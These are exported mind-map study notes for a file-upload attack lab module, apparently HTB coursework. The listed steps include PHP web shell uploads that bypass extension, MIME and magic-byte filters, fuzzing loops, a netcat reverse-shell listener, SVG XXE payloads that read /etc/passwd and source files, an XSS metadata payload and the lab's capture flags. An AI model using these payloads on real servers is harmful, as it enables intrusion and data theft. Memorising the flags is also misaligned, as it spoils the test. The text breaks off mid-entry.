---
tags: [CWES, XMind, output, xmind-output]
source_file: CWES.xmind
source_sheet: "1"
module: "File Upload Attacks"
output_topics: 39
---

# File Upload Attacks — XMind Outputs

> [!info] Yellow XMind topic semantics
> The author uses yellow topics to represent **outputs**. Every entry below corresponds to one yellow source topic and retains its XMind topic ID in a hidden validation marker.

## Outputs

> [!output]+ 🟨 Output 001
> Hello HTB
>
> **Source path:** File Upload Attacks → Absent Validation → Vulnerability Identification → try uploading it to the web → test.php → &lt;?php echo "Hello HTB";?&gt; → if we visit /test.php → Hello HTB
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b60303c9-482f-4011-828b-5ca342945b3f -->

> [!output]+ 🟨 Output 002
> #
>
> **Source path:** File Upload Attacks → Upload Exploitation → Reverse Shell → netcat → nc -lvnp OUR_PORT → #
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a91325a7-ac0e-46de-ac82-7fcc12a58def -->

> [!output]+ 🟨 Output 003
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
>
> **Source path:** File Upload Attacks → Upload Exploitation → Reverse Shell → netcat → nc -lvnp OUR_PORT → # → id → uid=33(www-data) gid=33(www-data) groups=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b5c573d8-3798-45c6-9c60-8f4e356814d4 -->

> [!output]+ 🟨 Output 004
> #
>
> **Source path:** File Upload Attacks → Upload Exploitation → Reverse Shell → Generating Custom Reverse Shell Scripts → msfvenom → start a netcat → visit its link → #
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 4d1dec82-221a-4f63-96a8-ca17b90fab68 -->

> [!output]+ 🟨 Output 005
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
>
> **Source path:** File Upload Attacks → Upload Exploitation → Reverse Shell → Generating Custom Reverse Shell Scripts → msfvenom → start a netcat → visit its link → # → id → uid=33(www-data) gid=33(www-data) groups=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 73d79085-df20-4f5f-a341-e3367c33edbf -->

> [!output]+ 🟨 Output 006
> /var/www/html#
>
> **Source path:** File Upload Attacks → Upload Exploitation → Reverse Shell → LAB → Try to exploit the upload feature to upload a web shell and get the content of /flag.txt → git clone https://github.com/Arrexel/phpbash.git → upload phpbash.php → visit /phpbash.php → /var/www/html#
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2f1cbc15-ec25-455d-9eab-43cfec9045c4 -->

> [!output]+ 🟨 Output 007
> HTB{g07_my_f1r57_w3b_5h3ll}
>
> **Source path:** File Upload Attacks → Upload Exploitation → Reverse Shell → LAB → Try to exploit the upload feature to upload a web shell and get the content of /flag.txt → git clone https://github.com/Arrexel/phpbash.git → upload phpbash.php → visit /phpbash.php → /var/www/html# → cat /flag.txt → HTB{g07_my_f1r57_w3b_5h3ll}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 599cc9d7-f533-4dfd-bb74-3cd6e32da081 -->

> [!output]+ 🟨 Output 008
> function checkFile(File) {
> ...SNIP...
>     if (extension !== 'jpg' &amp;&amp; extension !== 'jpeg' &amp;&amp; extension !== 'png') {
>         $('#error_message').text("Only images are allowed!");
>         File.form.reset();
>         $("#submit").attr("disabled", true);
>     ...SNIP...
>     }
> }
>
> **Source path:** File Upload Attacks → Client-Side Validation → Profile Image → limited to image → validation appears to be happening on the front-end → we can either → Disabling Front-end Validation → [CTRL+SHIFT+K] → Console → then we can type the function's name (checkFile) to get its detail → Code: javascript → function checkFile(File) {  ...SNIP...      if (extension !== 'jpg' &amp;&amp; extension !== 'jpeg' &amp;&amp; extension !== 'png') {          $('#error_message').text("Only images are allowed!");          File.form.reset();          $("#submit").attr("disabled", true);      ...SNIP...      }  }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 3df7cf0f-0204-4daf-a73c-db17145ef096 -->

> [!output]+ 🟨 Output 009
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
>
> **Source path:** File Upload Attacks → Client-Side Validation → LAB → upload an image → intercept in Burp → change the file name.ext and the content → Content-Disposition: form-data; name="uploadFile"; filename="shell.php" Content-Type: image/png  &lt;?php system($_REQUEST['cmd']); ?&gt; ------geckoformboundarya03ae5863944a627a32c1c92bc9b3249-- → Forward → Check the path for the image → use inspector and click on the profile image → visit the page /profile_images/phpbash.php?cmd=id → uid=33(www-data) gid=33(www-data) groups=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7b165706-0b3b-4be8-8125-7db73692b476 -->

> [!output]+ 🟨 Output 010
> HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}
>
> **Source path:** File Upload Attacks → Client-Side Validation → LAB → upload an image → intercept in Burp → change the file name.ext and the content → Content-Disposition: form-data; name="uploadFile"; filename="shell.php" Content-Type: image/png  &lt;?php system($_REQUEST['cmd']); ?&gt; ------geckoformboundarya03ae5863944a627a32c1c92bc9b3249-- → Forward → Check the path for the image → use inspector and click on the profile image → visit the page /profile_images/phpbash.php?cmd=id → uid=33(www-data) gid=33(www-data) groups=33(www-data) → /profile_images/phpbash.php?cmd=cat+/flag.txt → HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 00b340d2-f795-4fb1-89f5-bc60796f605a -->

> [!output]+ 🟨 Output 011
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
>
> **Source path:** File Upload Attacks → Blacklist Filters → LAB → code → use intruder to fuzz extensions → use python script to automate upload then visiting to check which extensions worked → .phar worked → curl http://94.237.53.219:56681/profile_images/shell.phar?cmd=id → uid=33(www-data) gid=33(www-data) groups=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 06c5de74-7e2e-4a47-9769-27d73d317a3d -->

> [!output]+ 🟨 Output 012
> HTB{1_c4n_n3v3r_b3_bl4ckl1573d}
>
> **Source path:** File Upload Attacks → Blacklist Filters → LAB → code → use intruder to fuzz extensions → use python script to automate upload then visiting to check which extensions worked → .phar worked → curl http://94.237.53.219:56681/profile_images/shell.phar?cmd=id → uid=33(www-data) gid=33(www-data) groups=33(www-data) → curl http://94.237.53.219:56681/profile_images/shell.phar?cmd=cat+/flag.txt → HTB{1_c4n_n3v3r_b3_bl4ckl1573d}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 615fa1c1-6bcb-4fcd-ae40-e54f05af8b66 -->

> [!output]+ 🟨 Output 013
> Word: shell%20.phtml.jpg
> Status: 200
> Content preview: uid=33(www-data) gid=33(www-data) groups=33(www-data)
> Word: shell.phtml%20.jpg
> Status: 200
> Content preview: uid=33(www-data) gid=33(www-data) groups=33(www-data)
>
> **Source path:** File Upload Attacks → Whitelist Filters → LAB → prepare wordlist → for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do     for ext in '.php' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.phps' '.phps' '.pht' '.phtm' '.phtml' '.pgif' '.shtml' '.htaccess' '.phar' '.inc'; do         echo "shell$char$ext.jpg" &gt;&gt; wordlist.txt         echo "shell$ext$char.jpg" &gt;&gt; wordlist.txt         echo "shell.jpg$char$ext" &gt;&gt; wordlist.txt         echo "shell.jpg$ext$char" &gt;&gt; wordlist.txt     done done → prepare script.py → Code #1 → curl each page and print the content → curl http://94.237.120.112:54448/profile_images/{word}?cmd=id → Word: shell%20.phtml.jpg Status: 200 Content preview: uid=33(www-data) gid=33(www-data) groups=33(www-data) Word: shell.phtml%20.jpg Status: 200 Content preview: uid=33(www-data) gid=33(www-data) groups=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 87315857-ddb7-45d7-8598-34ea3b62e08c -->

> [!output]+ 🟨 Output 014
> Word: shell..phar.jpg
> Content preview: uid=33(www-data) gid=33(www-data) groups=33(www-data)
> URL: http://94.237.59.242:54834/profile_images/shell..phar.jpg?cmd=id
> Word: shell.phar..jpg
> Status: 200
> Content preview: uid=33(www-data) gid=33(www-data) groups=33(www-data)
> URL: http://94.237.59.242:54834/profile_images/shell.phar..jpg?cmd=id
>
> **Source path:** File Upload Attacks → Whitelist Filters → LAB → prepare wordlist → for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do     for ext in '.php' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.phps' '.phps' '.pht' '.phtm' '.phtml' '.pgif' '.shtml' '.htaccess' '.phar' '.inc'; do         echo "shell$char$ext.jpg" &gt;&gt; wordlist.txt         echo "shell$ext$char.jpg" &gt;&gt; wordlist.txt         echo "shell.jpg$char$ext" &gt;&gt; wordlist.txt         echo "shell.jpg$ext$char" &gt;&gt; wordlist.txt     done done → prepare script.py → code #2 → run it → python3 script.py -f post.txt -g http://94.237.59.242:54834/profile_images/ -w wordlist.txt → Word: shell..phar.jpg Content preview: uid=33(www-data) gid=33(www-data) groups=33(www-data) URL: http://94.237.59.242:54834/profile_images/shell..phar.jpg?cmd=id Word: shell.phar..jpg Status: 200 Content preview: uid=33(www-data) gid=33(www-data) groups=33(www-data) URL: http://94.237.59.242:54834/profile_images/shell.phar..jpg?cmd=id
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 73307f35-6c59-4bf2-85d7-b8155d3cf074 -->

> [!output]+ 🟨 Output 015
> Trying word: shell.phtml%20.jpg
> URL: http://94.237.120.112:54448/profile_images/shell.phtml%2520.jpg?cmd=cat+/flag.txt
> Response Status Code: 200
> Response Content: HTB{1_wh173l157_my53lf}
>
> **Source path:** File Upload Attacks → Whitelist Filters → LAB → prepare wordlist → for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do     for ext in '.php' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.phps' '.phps' '.pht' '.phtm' '.phtml' '.pgif' '.shtml' '.htaccess' '.phar' '.inc'; do         echo "shell$char$ext.jpg" &gt;&gt; wordlist.txt         echo "shell$ext$char.jpg" &gt;&gt; wordlist.txt         echo "shell.jpg$char$ext" &gt;&gt; wordlist.txt         echo "shell.jpg$ext$char" &gt;&gt; wordlist.txt     done done → prepare script.py → modify the script to run the commnad ?cmd=cat+/flag.txt → Trying word: shell.phtml%20.jpg URL: http://94.237.120.112:54448/profile_images/shell.phtml%2520.jpg?cmd=cat+/flag.txt Response Status Code: 200 Response Content: HTB{1_wh173l157_my53lf}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 1d322788-b565-47de-b938-f6f89a86c6a5 -->

> [!output]+ 🟨 Output 016
> File successfully uploaded
>
> **Source path:** File Upload Attacks → Whitelist Filters → LAB → prepare wordlist → for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do     for ext in '.php' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.phps' '.phps' '.pht' '.phtm' '.phtml' '.pgif' '.shtml' '.htaccess' '.phar' '.inc'; do         echo "shell$char$ext.jpg" &gt;&gt; wordlist.txt         echo "shell$ext$char.jpg" &gt;&gt; wordlist.txt         echo "shell.jpg$char$ext" &gt;&gt; wordlist.txt         echo "shell.jpg$ext$char" &gt;&gt; wordlist.txt     done done → Manual CURL → curl -X POST "http://94.237.59.242:54834/upload.php" \   -H "Host: 94.237.59.242:54834" \   -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" \   -H "Accept: */*" \   -H "Accept-Language: en-US,en;q=0.5" \   -H "Referer: http://94.237.59.242:54834/" \   -H "X-Requested-With: XMLHttpRequest" \   -H "Content-Type: multipart/form-data; boundary=----geckoformboundarydb28e001436937d67fafbde00bb51c89" \   -H "Origin: http://94.237.59.242:54834" \   -H "Connection: keep-alive" \   -H "Sec-GPC: 1" \   -H "Priority: u=0" \   -d $'------geckoformboundarydb28e001436937d67fafbde00bb51c89\r\nContent-Disposition: form-data; name="uploadFile"; filename="shell.phar:.jpg"\r\nContent-Type: image/jpeg\r\n\r\n&lt;?php system($_REQUEST["cmd"]); ?&gt;\r\n------geckoformboundarydb28e001436937d67fafbde00bb51c89--' \   &amp;&amp; sleep 1 \   &amp;&amp; echo -e "\n\n[*] Testing uploaded file..." \   &amp;&amp; curl "http://94.237.59.242:54834/profile_images/shell.phar:.jpg?cmd=id" → File successfully uploaded
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ce7d39a8-03f7-4b4c-832d-450ae734a52d -->

> [!output]+ 🟨 Output 017
> [*] Testing uploaded file...
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
>
> **Source path:** File Upload Attacks → Whitelist Filters → LAB → prepare wordlist → for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do     for ext in '.php' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.phps' '.phps' '.pht' '.phtm' '.phtml' '.pgif' '.shtml' '.htaccess' '.phar' '.inc'; do         echo "shell$char$ext.jpg" &gt;&gt; wordlist.txt         echo "shell$ext$char.jpg" &gt;&gt; wordlist.txt         echo "shell.jpg$char$ext" &gt;&gt; wordlist.txt         echo "shell.jpg$ext$char" &gt;&gt; wordlist.txt     done done → Manual CURL → curl -X POST "http://94.237.59.242:54834/upload.php" \   -H "Host: 94.237.59.242:54834" \   -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" \   -H "Accept: */*" \   -H "Accept-Language: en-US,en;q=0.5" \   -H "Referer: http://94.237.59.242:54834/" \   -H "X-Requested-With: XMLHttpRequest" \   -H "Content-Type: multipart/form-data; boundary=----geckoformboundarydb28e001436937d67fafbde00bb51c89" \   -H "Origin: http://94.237.59.242:54834" \   -H "Connection: keep-alive" \   -H "Sec-GPC: 1" \   -H "Priority: u=0" \   -d $'------geckoformboundarydb28e001436937d67fafbde00bb51c89\r\nContent-Disposition: form-data; name="uploadFile"; filename="shell.phar:.jpg"\r\nContent-Type: image/jpeg\r\n\r\n&lt;?php system($_REQUEST["cmd"]); ?&gt;\r\n------geckoformboundarydb28e001436937d67fafbde00bb51c89--' \   &amp;&amp; sleep 1 \   &amp;&amp; echo -e "\n\n[*] Testing uploaded file..." \   &amp;&amp; curl "http://94.237.59.242:54834/profile_images/shell.phar:.jpg?cmd=id" → File successfully uploaded → [*] Testing uploaded file...  uid=33(www-data) gid=33(www-data) groups=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 465807dd-f037-4335-b2ef-a2b11b45fd7f -->

> [!output]+ 🟨 Output 018
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
>
> **Source path:** File Upload Attacks → Whitelist Filters → LAB → prepare wordlist → for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do     for ext in '.php' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.phps' '.phps' '.pht' '.phtm' '.phtml' '.pgif' '.shtml' '.htaccess' '.phar' '.inc'; do         echo "shell$char$ext.jpg" &gt;&gt; wordlist.txt         echo "shell$ext$char.jpg" &gt;&gt; wordlist.txt         echo "shell.jpg$char$ext" &gt;&gt; wordlist.txt         echo "shell.jpg$ext$char" &gt;&gt; wordlist.txt     done done → Manual CURL → curl -X POST "http://94.237.59.242:54834/upload.php" \   -H "Host: 94.237.59.242:54834" \   -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" \   -H "Accept: */*" \   -H "Accept-Language: en-US,en;q=0.5" \   -H "Referer: http://94.237.59.242:54834/" \   -H "X-Requested-With: XMLHttpRequest" \   -H "Content-Type: multipart/form-data; boundary=----geckoformboundarydb28e001436937d67fafbde00bb51c89" \   -H "Origin: http://94.237.59.242:54834" \   -H "Connection: keep-alive" \   -H "Sec-GPC: 1" \   -H "Priority: u=0" \   -d $'------geckoformboundarydb28e001436937d67fafbde00bb51c89\r\nContent-Disposition: form-data; name="uploadFile"; filename="shell.phar:.jpg"\r\nContent-Type: image/jpeg\r\n\r\n&lt;?php system($_REQUEST["cmd"]); ?&gt;\r\n------geckoformboundarydb28e001436937d67fafbde00bb51c89--' \   &amp;&amp; sleep 1 \   &amp;&amp; echo -e "\n\n[*] Testing uploaded file..." \   &amp;&amp; curl "http://94.237.59.242:54834/profile_images/shell.phar:.jpg?cmd=id" → File successfully uploaded → [*] Testing uploaded file...  uid=33(www-data) gid=33(www-data) groups=33(www-data) → curl 'http://94.237.59.242:54834/profile_images/shell.phar:.jpg?cmd=id → uid=33(www-data) gid=33(www-data) groups=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 3a970c5a-6502-43c8-b7bd-23d9d8b9c2fa -->

> [!output]+ 🟨 Output 019
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
>
> **Source path:** File Upload Attacks → Type Filters → validating the file content → Content-Type Header → e.g. image/jpg → This time we get File successfully uploaded, → http://SERVER_IP:PORT/profile_images/shell.php?cmd=id → uid=33(www-data) gid=33(www-data) groups=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ad3c5dc9-8fa9-493e-91aa-1658bf6f5d6c -->

> [!output]+ 🟨 Output 020
> text.jpg: ASCII text
>
> **Source path:** File Upload Attacks → Type Filters → validating the file content → File Content → MIME-Type → basic example → create a basic file with text in it → echo "this is a text file" &gt; text.jpg → file text.jpg → text.jpg: ASCII text
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: bf010770-b186-4c1f-8c65-adf3a2f8ca63 -->

> [!output]+ 🟨 Output 021
> text.jpg: GIF image data
>
> **Source path:** File Upload Attacks → Type Filters → validating the file content → File Content → MIME-Type → basic example → create a basic file with text in it → write GIF8 to the beginning of the file → echo "GIF8" &gt; text.jpg → file text.jpg → text.jpg: GIF image data
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 69f782b8-26ec-48e4-a580-05f18580ed64 -->

> [!output]+ 🟨 Output 022
> GIF8 uid=33(www-data) gid=33(www-data) groups=33(www-data)
>
> **Source path:** File Upload Attacks → Type Filters → validating the file content → File Content → MIME-Type → let's try to add GIF8 before our PHP code to try to imitate a GIF image while keeping our file extension as .php, → ... Connection: close  -W...."uploadFile"; filename="shell.php" Content-Type: image/jpg  GIF8 &lt;?php system($ REQUEST('cmd' ]); ?&gt; → File successfully uploaded → http://SERVER_IP:PORT/profile_images/shell.php?cmd=id → GIF8 uid=33(www-data) gid=33(www-data) groups=33(www-data)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c2e82409-1307-44f9-bb5e-d40e9469990e -->

> [!output]+ 🟨 Output 023
> File successfully uploaded
>
> **Source path:** File Upload Attacks → Type Filters → validating the file content → LAB → HTTP POST Message like → ... Connection: close  -W...."uploadFile"; filename="shell.php" Content-Type: image/jpg  GIF8 &lt;?php system($ REQUEST('cmd' ]); ?&gt; → File successfully uploaded
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9a0c7c56-e036-42b5-b170-e1051cffb097 -->

> [!output]+ 🟨 Output 024
> [+] SUCCESS!
>    Filename: shell.jpg%20.phtml
>    Tested as: shell.jpg%2520.phtml
>    Status: 200
>    Content: GIF8
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
>    URL: http://94.237.58.137:43049/profile_images/shell.jpg%2520.phtml?cmd=id
>
> **Source path:** File Upload Attacks → Type Filters → validating the file content → LAB → preepare script files → run the script → python script.py 94.237.58.137 43049 wordlist.txt → [+] SUCCESS!    Filename: shell.jpg%20.phtml    Tested as: shell.jpg%2520.phtml    Status: 200    Content: GIF8 uid=33(www-data) gid=33(www-data) groups=33(www-data)    URL: http://94.237.58.137:43049/profile_images/shell.jpg%2520.phtml?cmd=id
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 635a6799-7af4-4aff-a625-2015918cdc6b -->

> [!output]+ 🟨 Output 025
> HTB{m461c4l_c0n73n7_3xpl0174710n}
>
> **Source path:** File Upload Attacks → Type Filters → validating the file content → LAB → preepare script files → run the script → python script.py 94.237.58.137 43049 wordlist.txt → [+] SUCCESS!    Filename: shell.jpg%20.phtml    Tested as: shell.jpg%2520.phtml    Status: 200    Content: GIF8 uid=33(www-data) gid=33(www-data) groups=33(www-data)    URL: http://94.237.58.137:43049/profile_images/shell.jpg%2520.phtml?cmd=id → modify the script to be → full_test_url = f"{base_url}/profile_images/{test_name}?cmd=cat+/flag.txt" → HTB{m461c4l_c0n73n7_3xpl0174710n}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 81394abc-5e77-4177-bd82-d8253076aea8 -->

> [!output]+ 🟨 Output 026
> Comment                         :  "&gt;&lt;img src=1 onerror=alert(window.origin)&gt;
>
> **Source path:** File Upload Attacks → Limited File Uploads → file types → XSS → most basic example → web applications that display an image's metadata → include an XSS payload in one of the Metadata parameters → exiftool -Comment=' "&gt;&lt;img src=1 onerror=alert(window.origin)&gt;' HTB.jpg → exiftool HTB.jpg → Comment                         :  "&gt;&lt;img src=1 onerror=alert(window.origin)&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 6e7a8a52-b5c7-45bf-82fd-44fc351760dc -->

> [!output]+ 🟨 Output 027
> root:x:0:0:root:/root
>
> **Source path:** File Upload Attacks → Limited File Uploads → LAB → The above exercise contains an upload functionality that should be secure against arbitrary file uploads. Try to exploit it using one of the attacks shown in this section to read "/flag.txt" → upload SVG conatins XXE → ------geckoformboundaryea65558dc97e301ca06f7b8ff90254b6 Content-Disposition: form-data; name="uploadFile"; filename="saudi1.svg" Content-Type: image/svg+xml  &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt; &lt;svg&gt;&amp;xxe;&lt;/svg&gt; ------geckoformboundaryea65558dc97e301ca06f7b8ff90254b6-- → GET / → root:x:0:0:root:/root
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: feb0a6f7-e17b-41ea-9fd8-bf524b866dfa -->

> [!output]+ 🟨 Output 028
> HTB{my_1m4635_4r3_l37h4l}
>
> **Source path:** File Upload Attacks → Limited File Uploads → LAB → The above exercise contains an upload functionality that should be secure against arbitrary file uploads. Try to exploit it using one of the attacks shown in this section to read "/flag.txt" → upload SVG conatins XXE → Content-Disposition: form-data; name="uploadFile"; filename="saudi1.svg" Content-Type: image/svg+xml  &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "file:///flag.txt"&gt; ]&gt; &lt;svg&gt;&amp;xxe;&lt;/svg&gt; → GET / → HTB{my_1m4635_4r3_l37h4l}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 90ce2cdc-bf2c-46d1-b957-9b8dd2721ee4 -->

> [!output]+ 🟨 Output 029
> PD9waHAK....Qo=
>
> **Source path:** File Upload Attacks → Limited File Uploads → LAB → Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes) → upload SVG conatins XXE → Content-Disposition: form-data; name="uploadFile"; filename="saudi1.svg" Content-Type: image/svg+xml  &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"&gt; ]&gt; &lt;svg&gt;&amp;xxe;&lt;/svg&gt; → GET / → PD9waHAK....Qo=
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f0fbf550-43d3-4a4d-b7c1-d407045b1df0 -->

> [!output]+ 🟨 Output 030
> &lt;?php
> $target_dir = "./images/";
> ....
>
> **Source path:** File Upload Attacks → Limited File Uploads → LAB → Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes) → upload SVG conatins XXE → Content-Disposition: form-data; name="uploadFile"; filename="saudi1.svg" Content-Type: image/svg+xml  &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"&gt; ]&gt; &lt;svg&gt;&amp;xxe;&lt;/svg&gt; → GET / → PD9waHAK....Qo= → echo 'PD9waHAK....Qo=' | base64 -d → &lt;?php $target_dir = "./images/"; ....
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 3396be92-f58a-4150-b3a8-b7925b207ff0 -->

> [!output]+ 🟨 Output 031
> .phps                   [Status: 403
> .php                    [Status: 200
>
> **Source path:** File Upload Attacks → Skills Assessment → Discover the technology used in the web app → ffuf -u http://83.136.251.11:56928/indexFUZZ -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt → .phps                   [Status: 403 .php                    [Status: 200
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9a7726a1-70a1-4f9d-af98-83da230b1183 -->

> [!output]+ 🟨 Output 032
> Thank you for submitting your feedback
>
> **Source path:** File Upload Attacks → Skills Assessment → Discover allowed Extensions in upload → All of them are allowed in Intruder → Thank you for submitting your feedback
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 5ef772cf-367a-43b9-b45a-7b82a8faf132 -->

> [!output]+ 🟨 Output 033
> Only images are allowed
>
> **Source path:** File Upload Attacks → Skills Assessment → Discover the uplaoded file path → visit the API upload.php directly → visit /contact/upload.php → Only images are allowed
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d1a6c9d3-9d4b-4e05-b8e8-f6ec44d64888 -->

> [!output]+ 🟨 Output 034
> PD9waHAKcmVxd...
>
> **Source path:** File Upload Attacks → Skills Assessment → Discover the uplaoded file path → visit the API upload.php directly → visit /contact/upload.php → change request to POST → POST /contact/upload.php HTTP/1.1 Host: 83.136.253.132:41029 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 Sec-GPC: 1 Accept-Language: en-US,en;q=0.9 Accept-Encoding: gzip, deflate, br Connection: keep-alive Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYw282xkhpYBFgOAQ Content-Length: 341  ------WebKitFormBoundaryYw282xkhpYBFgOAQ Content-Disposition: form-data; name="uploadFile"; filename="saudi.svg" Content-Type: image/jpeg  &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"&gt; ]&gt; &lt;svg&gt;&amp;xxe;&lt;/svg&gt; ------WebKitFormBoundaryYw282xkhpYBFgOAQ-- → PD9waHAKcmVxd...
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 1b4be505-0503-43a0-aa37-dca820e89544 -->

> [!output]+ 🟨 Output 035
> &lt;?php
> require_once('./common-functions.php');
>
> // uploaded files directory
> $target_dir = "./user_feedback_submissions/";
>
> // rename before storing
> $fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
> $target_file = $target_dir . $fileName;
>
> // get content headers
> $contentType = $_FILES['uploadFile']['type'];
> $MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);
>
> // blacklist test
> if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
>     echo "Extension not allowed";
>     die();
> }
>
> // whitelist test
> if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
>     echo "Only images are allowed";
>     die();
> }
>
> // type test
> foreach (array($contentType, $MIMEtype) as $type) {
>     if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
>         echo "Only images are allowed";
>         die();
>     }
> }
>
> // size test
> if ($_FILES["uploadFile"]["size"] &gt; 500000) {
>     echo "File too large";
>     die();
> }
>
> if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
>     displayHTMLImage($target_file);
> } else {
>     echo "File failed to upload";
> }
>
> **Source path:** File Upload Attacks → Skills Assessment → Discover the uplaoded file path → visit the API upload.php directly → visit /contact/upload.php → change request to POST → POST /contact/upload.php HTTP/1.1 Host: 83.136.253.132:41029 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 Sec-GPC: 1 Accept-Language: en-US,en;q=0.9 Accept-Encoding: gzip, deflate, br Connection: keep-alive Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYw282xkhpYBFgOAQ Content-Length: 341  ------WebKitFormBoundaryYw282xkhpYBFgOAQ Content-Disposition: form-data; name="uploadFile"; filename="saudi.svg" Content-Type: image/jpeg  &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"&gt; ]&gt; &lt;svg&gt;&amp;xxe;&lt;/svg&gt; ------WebKitFormBoundaryYw282xkhpYBFgOAQ-- → PD9waHAKcmVxd... → decode base64 → &lt;?php require_once('./common-functions.php');  // uploaded files directory $target_dir = "./user_feedback_submissions/";  // rename before storing $fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]); $target_file = $target_dir . $fileName;  // get content headers $contentType = $_FILES['uploadFile']['type']; $MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);  // blacklist test if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {     echo "Extension not allowed";     die(); }  // whitelist test if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {     echo "Only images are allowed";     die(); }  // type test foreach (array($contentType, $MIMEtype) as $type) {     if (!preg_match('/image\/[a-z]{2,3}g/', $type)) 